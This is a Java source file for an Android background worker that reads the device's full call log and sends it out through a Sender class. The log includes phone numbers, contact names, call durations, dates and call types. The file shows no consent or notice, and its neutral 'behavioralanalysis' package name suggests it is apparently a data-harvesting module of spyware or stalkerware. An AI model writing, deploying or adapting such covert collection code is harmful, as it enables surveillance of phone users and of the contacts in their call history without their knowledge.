package com.behavioralanalysis.service;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Calls extends Worker {
    public static final String TAG = "call";
    private Context context;
    public Calls(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            JSONArray array = new JSONArray();
            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cursor = MainService.getContext().getContentResolver().query(allCalls, null, null, null, null);

            while (cursor.moveToNext()) {
                JSONObject object = new JSONObject();
                object.put(
                        "number",
                        cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.NUMBER)
                        )
                );
                object.put(
                        "name",
                        cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                        )
                );
                object.put(
                        "duration",
                        cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.DURATION)
                        )
                );
                object.put(
                        "date",
                        cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.DATE)
                        )
                );
                object.put(
                        "type",
                        Integer.parseInt(cursor.getString(
                                cursor.getColumnIndex(CallLog.Calls.TYPE)
                        ))
                );
                array.put(object);
            }

            Sender.send(TAG, array.toString());
            return Result.success();
        } catch (Exception ex) {
            return Result.failure();
        }
    }
}
